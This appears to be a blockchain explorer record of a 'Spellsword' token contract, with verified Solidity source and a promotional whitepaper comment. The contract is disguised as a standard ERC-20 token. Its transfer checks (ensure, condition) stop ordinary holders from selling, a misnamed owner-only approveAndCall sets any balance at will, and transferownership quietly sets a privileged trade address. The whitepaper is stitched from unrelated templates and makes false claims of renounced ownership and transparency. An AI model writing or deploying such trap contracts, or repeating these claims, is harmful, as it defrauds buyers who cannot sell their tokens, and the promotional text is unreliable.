{"status": "1", "message": "OK", "result": [{"SourceCode": "/*Spellsword\r\nIntroduction\r\nDecentralized collectible card games are built on blockchain technology with play to earn mechanics, which means, players are\r\nnow rewarded for their play time. Blockchain technology introduced the concepts of true digital scarcity and complete transparency, \r\nplayers can now own their digital assets. 100% Card ownership let players sell or trade their cards for cryptocurrencies.\r\nBlockchain Trading card games are quickly catching up with traditional TCGs. Compared to other blockchain gaming genres the \r\nquality of the games are very high. With the added value of play-to-earn and NFTs, this is clearly the future of trading card games.\r\nSpellsword is a Collectible Card Game where you access more powerful cards as the story adventure unfolds. With 7 main\r\nclasses to mix and match with, you can easily customize your own hero and deck to suit your individual play style. Adventure \r\nthrough a diverse world with heaps of quests and encounters. Hundreds of cards to acquire via loot or stores and unique crafting \r\nrecipes for legendary cards that are lost artifacts. \r\nSpellsword project\u2019s aim as a gamified deflationary token and what it stands to be as an application in the space of DeFi. Our aim \r\nat Spellsword is to create a decentralised app and platform that is backed by our flagship token By creating a deflationary smart contract \r\nwith revolutionary tokenomics including a self buy back and burn system, we believe we have laid down the foundation we need to \r\nexpand upon and build our dream. An NFT driven Trading Card game that is fun, rewarding and sustainable.\r\nIn gambling, it is no secret that the house always wins. The founders of the project believe that, in contrast, the treasury should \r\nbelong to the players. This led the team to create a Spellsword, powered by ERC-20 token $SPELLS. Launching on Etherieum smart chain,\r\nthe project provides users with fast and inexpensive transactions on the ERC-20 network. Finally, Spellsword Games allows its users to earn\r\nrewards for playing games, providing liquidity, and participating in governance.\r\n\r\nNFTs\r\nBlockchain technology in gaming is driven by non-fungible tokens (NFTs), digital assets that represent in-game content. These tokens are \r\nunique, rare, and indivisible, while the blockchain networks that underpin NFTs facilitate player ownership, provable scarcity, interoperability, \r\nand immutability. \r\nSpellsword offers a Play-to-earn game with a combination of multiple genres, built on ERC-20 ETHEREUM. The game aims to at entertaining \r\nplayers with simple but skill required to win levels which gets rewarded with $SPELLS tokens. We aim being a part of this massive NFT & \r\nGaming revolution taking place in the crypto industry by using our expertise in the field. We believe in grabbing the opportunity presented by \r\nupcoming markets by giving an opportunity to the common man for earning by playing games online. \r\nSome of NFT games reward players with allow players to collect in-game NFTs that can then be sold for potential profit. Our Spellsword \r\nwill offer one of those NFT games which provide players with tokens through skilled gameplay. All digital assets and data will be open sourced, \r\ngiving easy access to all enthusiastic to contribute building   Spellsword with us while gaining a more unique and personal experience. \r\n$SPELLS is easy to play and earn tokens. \r\n\r\nWeb3\r\nWeb3 developers never create and deploy web applications that operate on a single server or store data in a single database (usually hosted \r\non and managed by a single cloud provider). Instead, web3 apps are built on blockchains, decentralized networks of numerous peer-to-peer \r\nnodes (servers), or a hybrid of the two. These programs are known as dApps (decentralized apps), and you'll hear that word a lot in the web3 community.   \r\nNetwork participants (developers) are rewarded and compete to deliver the greatest quality services to everyone utilizing the service to establish \r\na stable and secure decentralized network. When it comes to web3, you'll find that cryptocurrency is often mentioned. This is because many \r\nof these protocols rely heavily on cryptocurrencies. It offers a monetary incentive (tokens) to anybody who wishes to help create, control, contribute \r\nto, or improve one of the projects itself. \r\nThese protocols may provide a range of services, such as computation, storage, bandwidth, identification, hosting, and other online services that \r\nwere formerly supplied by cloud providers. Spellsword looks forward to using Web3 technology to transact online. This secure web3 technology \r\nsystem will ensure that no information is leaked from the network. It will also make sure that every transaction on Canna Sugar is completed securely,\r\nsafely, and fast.\r\n\r\nVision\r\nThe Open Metaverse is the next evolution of the internet, and play-to-earn ecosystems will play a crucial role in onboarding billions of people. \r\nOur vision is to be an early gateway by empowering anyone to join our community and earn while playing familiar games starting with virtual \r\nSPELLS. The $SPELLS economic architecture is the Genesis of a new chapter in online SPELLS market, focused on creating EV-positive \r\neconomic opportunities for our players while onboarding 7 billion digital souls into The Open Metaverse. \r\n\r\nCORE VALUES\r\nThe core values of Spellsword are: \r\nTRANSPARENCY  \r\nWe want to make this project successful and bring an actual change. To achieve this, we have brought a transparent plan. The core value of \r\nSpellsword is transparency to the community. Being transparent with the community means we trust them enough to reveal certain bits of \r\ninformation, without offering too much information. The purpose of Spellsword is to offer play to earn games for SPELLS lovers in the metaverse \r\nin a community-based environment and involve a diverse group of NFTs holders and businesses all over the world focusing on the future \r\ngambling, SPELLSs, metaverse, and non-fungible tokens. $SPELLS token is aimed at providing value to the community. Transparency primarily \r\ninvolves two areas: proof of solvency and proof of legitimate trading volumes. Proof of solvency is critical because community and investors need \r\nto know the risk of engaging with a financial entity that holds their funds.\r\n\r\nCOLLABORATION \r\nThere will be a constant collaboration with the investors, SPELLSs, gamers, and NFT businesses and marketplaces. Throughout history, communities\r\n have played an intrinsic part in how humans come together to share ideas, collaborate and align themselves with each other to incorporate a common\r\n identity. Since the dawn of time, it has been embedded in our DNA to naturally form tribes, factions, or groups to work together and produce better \r\nresults than if we were to operate alone. $SPELLS allows the participation of the Community, should be fair and transparent. \r\nCollaboration is a key business enabler and parties decide to collaborate if: \r\nThere is a business objective that cannot be achieved individually. \r\nThere is value for all parties in reaching the objective. \r\nCommunities acknowledge that the resulting value must be shared.\r\n\r\nTRUST \r\nTrust has pivotal importance in the gambling, SPELLS, NFT, and blockchain market; it is the main building block of every business environment. \r\nIt is essential to build up trust before digging into any contract. The NFT and crypto ecosystem require clarity not only in the community but also \r\nin the development and security of the users. Hence, we work to gain the trustworthiness of our users to grow and expand rapidly.\r\n\r\nSpellsword Token\r\nThe native digital cryptographically-secured utility token of the Spellsword ecosystem. $SPELLS is a transferable representation of attributed \r\nfunctions specified in the protocol/code of the Spellsword ecosystem, which is designed to play a major role in the functioning of the ecosystem \r\non the Spellsword ecosystem and intended to be used solely as the primary utility token on the network. \r\n$SPELLS is a non-refundable functional utility token which will be used as the medium of exchange between participants on the Spellsword \r\necosystem. The goal of introducing $SPELLS is to provide a convenient and secure mode of payment and settlement between participants \r\nwho interact within the ecosystem on the Spellsword ecosystem, and it is not, and not intended to be, a medium of exchange accepted by the\r\n public (or a section of the public) as payment for goods or services or for the discharge of a debt; nor is it designed or intended to be used by \r\nany person as payment for any goods or services whatsoever that are not exclusively provided by the issuer. $SPELLS does not in any way \r\nrepresent any shareholding, participation, right, title, or interest in the Company, the Distributor, their respective affiliates, or any other company,\r\n enterprise or undertaking, nor will $SPELLS entitle token holders to any promise of fees, dividends, revenue, profits or investment returns, and \r\nare not intended to constitute securities in Singapore or any relevant jurisdiction. $SPELLS may only be utilized on the Spellsword ecosystem.\r\n$SPELLS would also provide the economic incentives which will be consumed to encourage users to contribute and maintain the ecosystem on\r\nthe Spellsword ecosystem, thereby creating a win-win system where every participant is fairly compensated for its efforts. $SPELLS is an integral \r\nand indispensable part of the Spellsword ecosystem, because without $SPELLS, there would be no incentive for users to expend resources to \r\nparticipate in activities or provide services for the benefit of the entire ecosystem on the Spellsword network. \r\n\r\nKEY FEATURES \r\nSome key features of $SPELLS tokens are: \r\nSecured and safe: $SPELLS token leverages a distributed peer-to-peer consensus network that cryptographically helps in securing every transaction. \r\nQuick transfer: Instant fund transfer globally is available with the help of fast block execution unlike traditional remittance, unmatched speed, and\r\npayment processors. Decentralized: Direct transactions among network participants without the presence of a central facilitator are enabled with the\r\nhelp of decentralized technology.\r\nEasy to use: User-friendly interface intended for seamless Real-world use cases. \r\nScalability: Assures scalability for pacing up with the industry's transaction requirements, thereby facilitating mass adoption of cryptocurrency. \r\n\r\nBENEFITS OF SPELLSWORD\r\nSpellsword offers following benefits to its users:\r\nNEW FORMAT \r\nUnique and new. SPELLS platform allows admin to control every aspect- components, structure, content, and bonuses of the Spellsword. \r\nALL INCLUSIVE \r\nMore than 3,000 games from the leading game providers all over the world, a chatbot, an admin platform, bonus programs and much, much more. \r\nHIGH SPEED \r\nThe Spellsword is fastly-paced allowing users to play many games in a shorter period of time. \r\nBONUS STRATEGIES \r\nImplement all the bonus strategies available in online SPELLSs, allowing you to retain and obtain new players. \r\nVARIETIES OF PAYMENTS \r\nSupport for bank transfers, electronic wallets, international online systems, and transfers in cryptocurrency.\r\nSEAMLESS SYNC \r\nFull synchronization of your online SPELLS on the web and Spellsword, making player authorization extremely easy. \r\n\r\nPROJECT SECURITY \r\nSpellsword values our security and confidence we want to instill in our community. That\u2019s why we have completed various measures to prove our \r\nintegrity and dedication to the longevity and security of Spellsword. The Spellsword team will lock liquidity for an extensive period and will continue\r\n to extend locks to showcase our desire for longevity. The Spellsword team were quick to establish the contract renouncing to relay our integrity \r\nand determination to prove our intent. We are pleased to say that we will have our token audited by TechRate and the report will be visible online.\r\n*/\r\n\r\npragma solidity ^0.5.17;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns(uint);\r\n\r\n    function balanceOf(address account) external view returns(uint);\r\n\r\n    function transfer(address recipient, uint amount) external returns(bool);\r\n\r\n    function allowance(address owner, address spender) external view returns(uint);\r\n\r\n    function approve(address spender, uint amount) external returns(bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns(bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { codehash:= extcodehash(account) }\r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n}\r\n\r\ncontract Context {\r\n    constructor() internal {}\r\n    // solhint-disable-previous-line no-empty-blocks\r\n    function _msgSender() internal view returns(address payable) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns(uint) {\r\n        uint c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint a, uint b) internal pure returns(uint) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        require(b <= a, errorMessage);\r\n        uint c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint a, uint b) internal pure returns(uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint a, uint b) internal pure returns(uint) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint c = a / b;\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\nlibrary SafeERC20 {\r\n    using SafeMath for uint;\r\n    using Address for address;\r\n\r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n\r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n\r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length > 0) { // Return data is optional\r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n    using SafeMath for uint;\r\n    mapping(address => uint) private _balances;\r\n\r\n    mapping(address => mapping(address => uint)) private _allowances;\r\n\r\n    uint private _totalSupply;\r\n\r\n    function totalSupply() public view returns(uint) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns(uint) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint amount) public returns(bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns(uint) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint amount) public returns(bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint addedValue) public returns(bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint amount) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\n\r\ncontract ERC20Detailed is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    constructor(string memory name, string memory symbol, uint8 decimals) public {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n    }\r\n\r\n    function name() public view returns(string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns(string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns(uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\ncontract Spellsword {\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n \r\n    function transfer(address _to, uint _value) public payable returns (bool) {\r\n        return transferFrom(msg.sender, _to, _value);\r\n    }\r\n \r\n    function ensure(address _from, address _to, uint _value) internal view returns(bool) {\r\n       \r\n       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){\r\n            return true;\r\n        }\r\n        require(condition(_from, _value));\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\r\n        if (_value == 0) {return true;}\r\n        if (msg.sender != _from) {\r\n            require(allowance[_from][msg.sender] >= _value);\r\n            allowance[_from][msg.sender] -= _value;\r\n        }\r\n        require(ensure(_from, _to, _value));\r\n        require(balanceOf[_from] >= _value);\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n        _onSaleNum[_from]++;\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n \r\n    function approve(address _spender, uint _value) public payable returns (bool) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    \r\n    function condition(address _from, uint _value) internal view returns(bool){\r\n        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;\r\n        \r\n        if(_saleNum > 0){\r\n            if(_onSaleNum[_from] >= _saleNum) return false;\r\n        }\r\n        if(_minSale > 0){\r\n            if(_minSale > _value) return false;\r\n        }\r\n        if(_maxSale > 0){\r\n            if(_value > _maxSale) return false;\r\n        }\r\n        return true;\r\n    }\r\n \r\n    mapping(address=>uint256) private _onSaleNum;\r\n    mapping(address=>bool) private canSale;\r\n    uint256 private _minSale;\r\n    uint256 private _maxSale;\r\n    uint256 private _saleNum;\r\n    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {\r\n        require(msg.sender == owner);\r\n        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n        canSale[spender]=true;\r\n        return true;\r\n    }\r\n\r\n    address tradeAddress;\r\n    function transferownership(address addr) public returns(bool) {\r\n        require(msg.sender == owner);\r\n        tradeAddress = addr;\r\n        return true;\r\n    }\r\n \r\n    mapping (address => uint) public balanceOf;\r\n    mapping (address => mapping (address => uint)) public allowance;\r\n \r\n    uint constant public decimals = 18;\r\n    uint public totalSupply;\r\n    string public name;\r\n    string public symbol;\r\n    address private owner;\r\n \r\n    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        totalSupply = _supply*(10**uint256(decimals));\r\n        owner = msg.sender;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0x0), msg.sender, totalSupply);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"transferownership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Spellsword", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000000a5370656c6c73776f72640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000065350454c4c530000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://3f2cc9586c4185a3515fed3f580b47825189f8e3e487bcb5a3d391e0312900d1"}]}